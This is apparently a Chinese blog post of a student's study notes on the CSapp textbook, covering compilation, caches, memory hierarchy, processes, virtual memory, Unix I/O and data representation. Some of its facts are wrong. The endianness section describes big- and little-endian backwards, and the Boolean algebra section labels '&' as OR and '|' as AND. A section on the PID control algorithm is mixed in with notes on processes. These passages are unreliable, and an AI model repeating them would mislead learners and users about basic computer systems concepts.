            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-01 02:25:43" itemprop="dateCreated datePublished" datetime="2022-01-01T02:25:43+08:00">2022-01-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-05-18 23:47:48" itemprop="dateModified" datetime="2022-05-18T23:47:48+08:00">2022-05-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>32k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>29 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="从CSapp中收获的知识"><a href="#从CSapp中收获的知识" class="headerlink" title="从CSapp中收获的知识"></a>从CSapp中收获的知识</h2><p><strong>CSapp</strong>是一本很好的书，它像极了一本“技术字典”，知识十分全面但又不深入，对学习计算机有着引领性的作用</p>
<p>我学习<strong>CSapp</strong>已经有一段时间了，有些章节可以调起我的兴趣，使我在网络上进行了知识扩充，但有些章节用大段大段的文字来劝退我，甚至还有一些章节玩起了“高数”，搞得我很懵逼</p>
<p><strong>CSapp</strong>上的知识太杂，太广，我感觉好多知识我都没法利用上（或许以后用得上），我害怕搞忘了这些知识，于是我也做过章节总结，但是我发现这样做的效率并不高，所以我打算不以章节为单位进行总结，而是把知识拆分为小块，逐一记录</p>
<hr>
<h2 id="栈帧"><a href="#栈帧" class="headerlink" title="栈帧"></a>栈帧</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641111569636-1646286364492-1646808754595-1646808862601.png" class width="1641111569636"> 
<h2 id="程序执行流程"><a href="#程序执行流程" class="headerlink" title="程序执行流程"></a>程序执行流程</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639405451872-1640399662182-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639405451872"> 
<p>文字版本如下：</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1640400471882-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1640400471882"> 
<h2 id="编译器驱动程序"><a href="#编译器驱动程序" class="headerlink" title="编译器驱动程序"></a>编译器驱动程序</h2><p>编译器驱动程序的工作：调用语言预处理器，编译器，汇编器，链接器</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641118618666-1646286364492-1646808754595-1646808862601.png" class width="1641118618666"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646665002297-1646808754595-1646808862601.png" class width="1646665002297"> 
<p>详细过程：</p>
<ul>
<li><strong>预处理阶段</strong>：预处理器（cpp）根据以字符 “#” 开头的命令，修改原始的 C 程序（比如 hello.c 中第 1 行的<code>#include</code>命令告诉预处理器读取系统头文件 stdio.h 的内容）并把它直接插入程序文本中，结果就得到了另一个 C 程序<ul>
<li>通常是以 .i 作为文件扩展名</li>
<li>所谓的头文件，里面装的其实就是函数声明（libc库中的函数：scanf，printf 等）</li>
</ul>
</li>
<li><strong>编译阶段</strong>：编译器（ccl）将文本文件 hello.i 翻译成文本文件 hello.s，它包含一个汇编语言程序<ul>
<li>.s 文件其实就是装有汇编语言的文件</li>
</ul>
</li>
<li><strong>汇编阶段</strong>：汇编器（as）将 hello.s 翻译成机器语言指令，把这些指令打包成一种叫做可重定位目标程序（relocatable object program）的格式，并将结果保存在目标文件 hello.o 中<ul>
<li>hello.o 文件是一个二进制文件，它包含的 17 个字节是函数 main 的指令编码</li>
<li>如果我们在文本编辑器中打开 hello.o文件，将看到一堆乱码（二进制）</li>
</ul>
</li>
<li><strong>链接阶段</strong>：链接器（ld）就负责处理合并各个 hello.o 文件，结果就得到 hello 文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统执行<ul>
<li>请注意，hello 程序调用了 printf 函数，它是每个 C 编译器都提供的标准 C 库中的一个函数</li>
<li>printf 函数存在于一个名为 printf.o 的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的 hello.o 程序中</li>
<li>通过修改 hello.o 可以影响最终文件 hello 的效果</li>
</ul>
</li>
</ul>
<h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><p>抽象是从众多的事物中抽取出共同的、本质性的<strong>特征</strong></p>
<p><strong>指令集架构</strong>是对 <strong>实际处理器硬件</strong> 的抽象</p>
<p><strong>文件</strong>是对 <strong>I/O设备</strong> 的抽象</p>
<p><strong>虚拟内存</strong>是对 <strong>程序存储器</strong> 的抽象</p>
<p><strong>虚拟机</strong>是对 <strong>整个计算机</strong> 的抽象</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639413250532-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639413250532"> 
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p><strong>缓存</strong>（cache），原始意义是指访问速度比一般随机存取存储器（RAM）快的一种高速存储器，通常它不像系统主存那样使用 <strong>[DRAM]技术</strong> ，而使用昂贵但较快速的 <strong>[SRAM]技术</strong> ，缓存的设置是所有现代计算机系统发挥高性能的重要因素之一</p>
<p>缓存的工作原理是当CPU要读取一个数据时，首先从CPU缓存中查找，找到就立即读取并送给CPU处理，没有找到，就从速率相对较慢的内存中读取并送给CPU处理 </p>
<p><strong>缓存命中</strong></p>
<p>但程序需要在第 <strong>n</strong> 层中查找数据时：它会首先在第 <strong>n-1</strong> 层中查找， 如果数据刚好就在第 <strong>n-1</strong> 层中，就直接使用第 <strong>n-1</strong> 层中的数据，称为<strong>缓存命中</strong></p>
<p>从第 <strong>n-1</strong> 层中读取，要比从第 <strong>n</strong> 层中读取更快</p>
<p><strong>缓存不命中</strong></p>
<p>另一方面，如果程序没有在第 <strong>n-1</strong> 层中查找到数据，那么它便会在第 <strong>n</strong> 层中查找，称为<strong>缓存不命中</strong>，同时会把第 <strong>n</strong> 层的数据写入第 <strong>n-1</strong> 层</p>
<h2 id="内存阶层"><a href="#内存阶层" class="headerlink" title="内存阶层"></a>内存阶层</h2><p>速度快的存储器往往容量小，容量大的储存器往往速度慢</p>
<p>所以综合存储器的优劣，内存阶层的机制出现了</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641115585515-1646286364492-1646808754595-1646808862601.png" class width="1641115585515"> 
<p>核心思想为：上一层（更快更小）为下一层（更大更慢）的缓存</p>
<p>内存阶层是在电脑架构下储存系统阶层的排列顺序，每一层于下一层相比都拥有较高的速度和较低延迟性，以及较小的容量（也有少量例外）</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th style="text-align:left"><strong>位于哪里</strong></th>
<th style="text-align:left"><strong>存储容量</strong></th>
<th style="text-align:left"><strong>访问时间</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>CPU寄存器</td>
<td style="text-align:left">位于CPU执行单元中</td>
<td style="text-align:left">CPU寄存器通常只有几个到几十个，每个寄存器的容量取决于CPU的字长，所以一共只有几十到几百字节</td>
<td style="text-align:left">寄存器是访问速度最快的存储器，典型的访问时间是几纳秒</td>
</tr>
<tr>
<td>Cache</td>
<td style="text-align:left">和MMU一样位于CPU核中</td>
<td style="text-align:left">Cache通常分为几级，最典型的是如上图所示的两级Cache，一级Cache更靠近CPU执行单元，二级Cache更靠近物理内存，通常一级Cache有几十到几百KB，二级Cache有几百KB到几MB</td>
<td style="text-align:left">典型的访问时间是几十纳秒</td>
</tr>
<tr>
<td>内存</td>
<td style="text-align:left">位于CPU外的芯片，与CPU通过地址和数据总线相连</td>
<td style="text-align:left">典型的存储容量是几百MB到几GB</td>
<td style="text-align:left">典型的访问时间是几百纳秒</td>
</tr>
<tr>
<td>硬盘</td>
<td style="text-align:left">位于设备总线上，并不直接和CPU相连，CPU通过设备总线的控制器访问硬盘</td>
<td style="text-align:left">典型的存储容量是几百GB</td>
<td style="text-align:left">典型的访问时间是几毫秒，是寄存器的“10的6次方”倍</td>
</tr>
</tbody>
</table>
</div>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641117200100-1646286364492-1646808754595-1646808862601.png" class width="1641117200100"> 
<h2 id="管理单元"><a href="#管理单元" class="headerlink" title="管理单元"></a>管理单元</h2><p>计算机常用“扇区”，“簇”，“块”，“页”等概念，这些都是<strong>管理单元</strong></p>
<p><strong>扇区：</strong>（Sector）</p>
<p>扇区，顾名思义，每个磁盘有多条同心圆似的磁道，磁道被分割成多个部分，每部分的弧长加上到圆心的两个半径，恰好形成一个扇形，所以叫做扇区 </p>
<p>扇区是磁盘中最小的物理存储单位（每个扇区的大小是512字节，通常4096字节）</p>
<p><strong>块：</strong>（Block）</p>
<p>块是操作系统中最小的逻辑存储单元（例如内存块的基本组成单元：chunk）</p>
<p><strong>簇：</strong></p>
<p>簇是微软操作系统（DOS、WINDOWS等）中磁盘文件存储管理的最小单位 </p>
<p><strong>块和簇的关系：</strong></p>
<p>在Windows下如NTFS等文件系统中叫做簇</p>
<p>在Linux下如Ext4等文件系统中叫做块</p>
<p>每个簇或者块可以包括2、4、8、16、32、64… “2的n次方” 个扇区 </p>
<p><strong>页：</strong>（page）</p>
<p>页是内存的最小存储单位，页的大小通常为磁盘块大小的 “2的n次方” 倍，是内存操作的基本单位 </p>
<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><p>操作系统有两目的：</p>
<p>1.防止硬件被失控的应用滥用</p>
<p>2.向应用程序提供简单一致的机制来控制复杂的低级硬件</p>
<p>操作系统通过几个基本的<strong>抽象</strong>概念来实现这两个功能：</p>
<p>1.<strong>文件</strong>是对 <strong>I/O设备</strong> 的抽象</p>
<p>2.<strong>虚拟内存</strong>是对 <strong>程序存储器</strong> 的抽象</p>
<p>3.<strong>进程</strong>是对 <strong>处理器，内存，I/O设备</strong> 的抽象</p>
<h2 id="程序计数器-PC"><a href="#程序计数器-PC" class="headerlink" title="程序计数器(PC)"></a>程序计数器(PC)</h2><p>程序计数器（PC）是CPU控制部件中的一种，用于存放指令的地址 </p>
<p>程序计数器是一个概念上的说法，<strong>不同的机型把不同的存储器当成程序计数器</strong></p>
<ul>
<li>8086：IP寄存器  </li>
<li>i386：EIP寄存器</li>
<li>amd64：RIP寄存器</li>
</ul>
<h2 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h2><p>内核可以决定抢占当前进程，并重新开始一个被抢占的进程，这种决策叫做<strong>调度</strong>，是由内核中被称为“调度器”的代码处理的</p>
<p><strong>上下文切换机制</strong>用于：保存“被调度进程”的数据</p>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>当程序在系统上运行时，操作系统会提供一种 <strong>假象</strong> ，就好像系统上只有这个程序在运行一样，程序看上去是在 <strong>独占</strong> 处理器（该程序是系统资源中唯一的对象）</p>
<p>这些 <strong>假象</strong> 是通过 <strong>进程</strong> 这个概念来实现的</p>
<p>​        //在系统中，各种程序交替执行，而 <strong>进程</strong> 把不同功能的程序 <strong>区分</strong> 开来</p>
<p>在单处理器系统中：</p>
<p>程序想要“并发处理多个进程”时，必须要先保存当前进程的 <strong>上下文</strong> ，然后创建新进程的 <strong>上下文</strong></p>
<p>比如“hello”执行的过程就涉及到两个进程：1.shell    2.hello</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639410149675-1640976664503-1646286364492-1646808754595-1646808862601.png" class width="1639410149675"> 
<p>系统中的每个程序都运行在某个进程的上下文中，上下文就是程序正确运行所需要的状态（包括：存放在内存中的代码和数据，栈和通用寄存器中的内容，程序计数器，环境变量，打开文件描述符的集合）</p>
<p>进程将会提供给应用程序两个关键的抽象：</p>
<ul>
<li>逻辑控制流</li>
<li>私有地址空间</li>
</ul>
<h2 id="逻辑控制流"><a href="#逻辑控制流" class="headerlink" title="逻辑控制流"></a>逻辑控制流</h2><img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641872879336-1646286364492-1646808754596-1646808862601.png" class width="1641872879336"> 
<p>实际上：系统中的进程是<strong>交错运行</strong>的，每个进程执行它流的一部分，然后被抢占（暂时挂起），接着轮到其他进程</p>
<p>进程提供的假象：好像每个程序都在<strong>单独地</strong>使用处理器</p>
<p>这种假象就是：逻辑控制流，它仿佛可以控制程序的逻辑行为，一步一步的流向，可以使用<strong>流程图</strong>来表现这种行为的流动，方便了调试人员对程序执行流程的把控</p>
<h2 id="并发流"><a href="#并发流" class="headerlink" title="并发流"></a>并发流</h2><p>系统中的逻辑流有多种不同的形式：异常处理，进程，信号处理，线程，java进程……</p>
<p>并发流：在时间上，一个逻辑流和另一个逻辑流冲突，这两个流并发运行</p>
<p>并发：多条流在同时执行的一般现象</p>
<p>多任务（时间分片）：多个进程流量执行的现象</p>
<h2 id="私有地址空间"><a href="#私有地址空间" class="headerlink" title="私有地址空间"></a>私有地址空间</h2><p>私有地址空间也是进程提供的假象，好像程序在单独地使用系统地址空间一样</p>
<p>​        // 私有地址空间是虚拟内存的子集</p>
<p>每个进程都会为所对应的程序提供一份“私有地址空间”，每个“私有地址空间”完全一致，并且只能被所对应的程序访问</p>
<h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><p>Unix提供了大量从C程序中操作进程的系统调用</p>
<h2 id="僵死进程"><a href="#僵死进程" class="headerlink" title="僵死进程"></a>僵死进程</h2><p>当一个进程因为某种原因终止后，内核并不会马上把它清除，而是等待它的父进程把它回收</p>
<p>一个终止了但是还没有被回收的进程被称为<strong>僵死进程</strong></p>
<p>如果一个进程的父进程终止了，内核会安排“init进程”成为它的“养父”（代替父进程回收子进程）</p>
<p>​        // “init进程”的PID为“1”，“调度进程”（系统进程）的PID为“0”</p>
<h2 id="PID算法"><a href="#PID算法" class="headerlink" title="PID算法"></a>PID算法</h2><p>PID，就是“比例（proportional）、积分（integral）、微分（derivative）” </p>
<p>PID控制应该算是应用非常广泛的控制算法，小到控制一个元件的温度，大到控制无人机的飞行姿态和飞行速度等等，都可以使用PID控制。这里我们从原理上来理解PID控制</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1642074027298-1646286364492-1646808754596-1646808862601.png" class> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1642074041508-1646286364492-1646808754596-1646808862601.png" class width="1642074041508"> 
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程（英语：thread）是操作系统能够进行<strong>运算调度</strong>的最小单位 </p>
<p>线程被包含在进程之中，是进程中的实际运作单位 </p>
<p>​        // <strong>多线程</strong> 比 <strong>多进程</strong> 跟高效 </p>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>虚拟内存为每个进程提供了一个<strong>假象</strong></p>
<p>就好像每个进程在<strong>单独占用</strong>内存空间一样，每个进程中看到的内存是一样的（虚拟地址空间）</p>
<p>即：该进程是系统资源中唯一的对象</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639410537327-1640976664503-1646286364492-1646808754596-1646808862602.png" class width="1639410537327">   
<p>物理内存是不连续的，但是操作系统完成了“使内存看起来是连续的”这样一份抽象，创造了 <strong>虚拟内存</strong> ，并且为虚拟内存中的各个空间进行了编号</p>
<ul>
<li>虚拟内存<strong>用户空间</strong>每个进程各一份</li>
<li>虚拟内存<strong>内核空间</strong>所有进程共享一份</li>
<li>虚拟内存 mmap 段中的<strong>动态链接库</strong>仅在物理内存中装载一份</li>
</ul>
<p><strong>虚拟内存的作用</strong></p>
<p>硬件只能识别“物理地址”，而“物理地址”是不连续的并且不方便显示，这就给调试程序带来了巨大的影响</p>
<p>所以操作系统抽象出了“虚拟内存”，把硬件中的数据映射到“虚拟内存”中，方便了调试</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641630776102-1646286364493-1646808754596-1646808862602.png" class width="1641630776102">  
<h2 id="虚拟内存作为缓存工具"><a href="#虚拟内存作为缓存工具" class="headerlink" title="虚拟内存作为缓存工具"></a>虚拟内存作为缓存工具</h2><p>VM系统（虚拟程序系统）将虚拟内存分割成块，这些块被称为虚拟页</p>
<p>每个虚拟页的大小为“P = 2的p次方”字节，类似地，物理内存被分割为物理页，大小也为P字节（物理页也被称为“页帧”）</p>
<p>在任意时刻，虚拟页面的集合都分为3个不相交的子集：</p>
<ul>
<li>未分配的：VM系统还未分配的页，没有数据和它们相关，不占用磁盘空间</li>
<li>缓存的：当前已缓存在物理内存中的已分配页</li>
<li>未缓存的：当前未缓存在物理内存中的已分配页</li>
</ul>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1644400609758-1646657383403-1646808754596-1646808862602.png" class width="1644400609758"> 
<h2 id="Proc文件系统"><a href="#Proc文件系统" class="headerlink" title="Proc文件系统"></a>Proc文件系统</h2><p>Proc文件系统是一个伪文件系统，它只存在于内存中（不占用外存空间），允许“用户模式进程”访问“内核数据结构”的内容</p>
<p>Proc文件系统将许多“内核数据结构”的内容输出为一个用户程序可以读的“文本文件”</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /proc/cpuinfo				<span class="comment"># 输出CPU属性</span></span><br></pre></td></tr></table></figure>
<h2 id="Unix-I-O"><a href="#Unix-I-O" class="headerlink" title="Unix I/O"></a>Unix I/O</h2><p>一个 Linux 文件就是一个 m 个字节的序列，所有的 I/O 设备（例如网络、磁盘和终端）都被模型化为文件，而所有的输入和输出都被当作对相应文件的读和写来执行</p>
<p>这种将设备优雅地映射为文件的方式，允许 Linux 内核引出一个简单、低级的应用接口，称为 Unix I/O，这使得所有的输入和输出都能以一种统一且一致的方式来执行：</p>
<ul>
<li><strong>打开文件</strong>：一个应用程序通过要求内核打开相应的文件，来宣告它想要访问一个 I/O 设备，内核返回一个小的非负整数，叫做 <strong>描述符</strong> ，它在后续对此文件的所有操作中标识这个文件，内核记录有关这个打开文件的所有信息，应用程序只需记住这个描述符</li>
<li><strong>改变当前的文件位置</strong>：对于 <strong>每个打开的文件</strong> ，内核保持着一个 <strong>文件位置</strong>（符号为 k），初始为 0，这个文件位置是 <strong>从文件开头起始的字节偏移量（相当于“指向”内存中文件末尾的一个标记，也可以用来记录该文件在内存中的大小）</strong>，应用程序能够通过执行 seek 操作，显式地设置文件的当前位置为 k</li>
<li><strong>读写文件</strong>：一个读操作就是 <strong>从文件复制 n &gt; 0 个字节到内存（从当前文件位置 k 开始，然后将 k 增加到 k+n）</strong> ，假设给定一个大小为 m 字节的文件，当 k&gt;=m 时（文件被完全读入内存）会触发一个称为 end-of-file（EOF）的条件，应用程序能检测到这个条件，在文件结尾处并没有明确的“EOF符号”，类似地，写操作就是 <strong>从内存复制 n &gt; 0 个字节到一个文件）从当前文件位置 k 开始，然后更新 k）</strong></li>
<li><strong>关闭文件</strong>：当应用完成了对文件的访问之后，它就通知内核关闭这个文件，作为响应，<strong>内核释放文件打开时创建的数据结构，并将这个描述符恢复到可用的描述符池中</strong>，无论一个进程因为何种原因终止时，内核都会关闭所有打开的文件并释放它们的内存资源</li>
</ul>
<p>Linux shell 创建的每个进程开始时都有三个打开的文件：<strong>标准输入</strong>（描述符为 0）、<strong>标准输出</strong>（描述符为 1）和 <strong>标准错误</strong>（描述符为 2），头文件  定义了常量 STDIN_FILENO、STDOUT_FILENO 和 STDERR_FILENO，它们可用来代替显式的描述符值</p>
<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>文件就是 <strong>字节序列</strong></p>
<p>系统中所有的输入输出都是通过使用 <strong>Unix I/O</strong> 的 <strong>系统函数</strong> 来实现的，文件向应用程序提供了一个 <strong>统一的视图</strong> ，来看待系统中可能含有的各种形式的 <strong>I/O设备</strong>，在linux操作系统中有一个思想“一切皆文件”，即使是内存中的进程都可以被当成文件输出</p>
<p>每个 Linux 文件都有一个 <strong>类型</strong>（type）来表明它在系统中的角色： </p>
<ul>
<li><strong>普通文件</strong>（regular file）：包含任意数据，应用程序常常要区分 <strong>文本文件</strong> 和 <strong>二进制文件 </strong> ，文本文件是只含有 ASCII 或 Unicode 字符的普通文件，二进制文件是所有其他的文件<ul>
<li>对内核而言，文本文件和二进制文件没有区别</li>
<li>Linux 文本文件包含了一个 <strong>文本行</strong>（text line）序列，其中每一行都是一个字符序列，以一个新行符（“\n”）结束</li>
<li>新行符与 ASCII 的换行符（LF）是一样的，其数字值为 0x0a</li>
</ul>
</li>
<li><strong>目录</strong>（directory）：是包含一组 <strong>链接</strong> 的文件，其中每个链接都将一个 <strong>文件名</strong> 映射到一个文件，这个文件可能是另一个目录<ul>
<li>每个目录至少含有两个条目：是到该目录自身的链接，以及是到目录层次结构中 <strong>父目录</strong> 的链接</li>
<li>你可以用 mkdir 命令创建一个目录，用 Is 查看其内容，用 rmdir 删除该目录</li>
</ul>
</li>
<li><strong>套接字</strong>（socket）：是用来与另一个进程进行跨网络通信的文件</li>
</ul>
<p>其他文件类型包含 <strong>命名通道</strong> （named pipe）、  <strong>符号链接</strong> （symbolic link），以及 <strong>字符和块设备</strong> （character and block device）</p>
<h2 id="RIO-健壮地读写"><a href="#RIO-健壮地读写" class="headerlink" title="RIO-健壮地读写"></a>RIO-健壮地读写</h2><p>我们会讲述一个 I/O 包，称为 RIO（Robust I/O，健壮的 I/O）包，它会自动为你处理上文中所述的不足值，在像网络程序这样容易出现不足值的应用中，RIO 包提供了方便、健壮和高效的 I/O</p>
<p>RIO 提供了两类不同的函数： </p>
<ul>
<li><strong>无缓冲的输入输出函数</strong>：这些函数直接在内存和文件之间传送数据，没有应用级缓冲，它们对将二进制数据读写到网络和从网络读写二进制数据尤其有用</li>
<li><strong>带缓冲的输入函数</strong>：这些函数允许你高效地从文件中读取文本行和二进制数据，这些文件的内容缓存在应用级缓冲区内，类似于为 printf 这样的标准 I/O 函数提供的缓冲区<ul>
<li>与【110】中讲述的带缓冲的 I/O 例程不同，带缓冲的 RIO 输入函数是线程安全的，它在同一个描述符上可以被交错地调用</li>
<li>例如，你可以从一个描述符中读一些文本行，然后读取一些二进制数据，接着再多读取一些文本行</li>
</ul>
</li>
</ul>
<h2 id="共享文件"><a href="#共享文件" class="headerlink" title="共享文件"></a>共享文件</h2><p>可以用许多不同的方式来共享 Linux 文件，内核用三个相关的数据结构来表示打开的文件： </p>
<ul>
<li><strong>描述符表</strong>（descriptor table）：每个进程都有它独立的描述符表，它的表项是由进程打开的文件描述符来索引的。每个打开的描述符表项指向文件表中的一个表项</li>
<li><strong>文件表</strong>（file table）：打开文件的集合是由一张文件表来表示的，所有的进程共享这张表，每个文件表的表项组成：<ul>
<li>包括当前的 <strong>文件位置</strong> 、<strong>引用计数</strong>（reference count）（即当前指向该表项的描述符表项数），以及一个 <strong>指向 v-node 表</strong> 中对应表项的指针</li>
<li>关闭一个描述符会减少相应的文件表表项中的引用计数</li>
<li>内核不会删除这个文件表表项，直到它的引用计数为零</li>
</ul>
</li>
<li><strong>v-node 表</strong>（v-node table）：同文件表一样，所有的进程共享这张 v-node 表，每个表项包含 stat 结构中的大多数信息，包括 st_mode 和 st_size 成员</li>
</ul>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>系统并不是由 <strong>孤立的</strong> 硬件和软件组成的结合体，而是可以通过 <strong>网络</strong> 相互通信</p>
<p>对于一个单独的系统而言，网络可以认为是一个<strong>I/O设备</strong>（输入或输出数据到本机）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639411220256-1640976664503-1646286364492-1646808754596-1646808862602.png" class width="1639411220256"> 
<h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><p>计算机的发展始终围绕两个目的：1.更多    2.更快</p>
<p><strong>并发</strong>：指一个同时具有多活动的系统</p>
<p><strong>并行</strong>：指使用 <strong>并发</strong> 来使一个系统运行得更快</p>
<p>并行可以在计算机系统的多个 <strong>抽象层次</strong> 中运用，其中最主要的有3个：</p>
<p><strong>1.线程级并发</strong></p>
<p>构建在进程这个抽象之上，我们可以设计出有多个 <strong>“程序执行工具”</strong> 的系统，这导致了 <strong>并行</strong></p>
<p>这个“程序执行工具”就是线程，使用线程，我们甚至可以在一个进程中执行多个 <strong>控制流</strong></p>
<p><strong>2.指令级并行</strong></p>
<p>构建在较低的抽象层次上，使处理器可以<strong>同时执行</strong>多条指令</p>
<p><strong>3.单指令，多数据并行</strong></p>
<p>构建在较最的抽象层次上，允许一条指令可以产生多个<strong>“并行执行”</strong>的操作</p>
<p>​        //即<strong>SIMD</strong>并行</p>
<h2 id="指令集架构"><a href="#指令集架构" class="headerlink" title="指令集架构"></a>指令集架构</h2><p>指令集架构（InstructionSetArchitecture）</p>
<p>描述：指的是CPU机器码所使用的指令的集合以及其背后的寄存器体系、总线设计等逻辑框架 ，也是规定的一系列CPU与其他硬件电路相配合的指令系统 </p>
<p>作用：定义 <strong>机器级程序</strong> 的格式和行为，它定义了 <strong>处理器状态</strong> ， <strong>指令的格式</strong> ，以及 <strong>每条指令的影响</strong></p>
<p>行为：每条指令<strong>顺序执行</strong>，一条指令完成后，另一条指令开始</p>
<p>​        //不同进程中的指令会被CPU<strong>并发</strong>处理，但是就一个进程而言，它的指令是<strong>“顺序执行”</strong>的</p>
<h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a>字节序</h2><p>大端序：符合人类的认知（低地址存低位，高地址存高位）</p>
<p>小端序：利用机器的运算（低地址存高位，高地址存低位）</p>
<p>为了方便阅读程序，我们通常把低地址写在上面，把高地址写在下面</p>
<p>​        // 这样小端序就“符合人类的认知”</p>
<p>不同的系统采用不同的<strong>字节序</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_show_bytes</span><span class="params">(<span class="keyword">int</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ival = val;</span><br><span class="line">    <span class="keyword">float</span> fval = (<span class="keyword">float</span>) ival;</span><br><span class="line">    <span class="keyword">int</span> *pval = &amp;ival;</span><br><span class="line">    show_int(ival);</span><br><span class="line">    show_fload(fval);</span><br><span class="line">    show_pointer(pval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639568507336-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639568507336"> 
<h2 id="布尔代数"><a href="#布尔代数" class="headerlink" title="布尔代数"></a>布尔代数</h2><p>将逻辑值True和False用二进制值“1”和“0”表示，设计出了一种代数</p>
<p>基础逻辑运算：“ ~ ”（非），“ &amp; ”（或），“ | ”（与），“ ^ ”（异或）</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639569041012-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639569041012"> 
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1639569059817-1640976664503-1646286364493-1646808754596-1646808862602.png" class width="1639569059817"> 
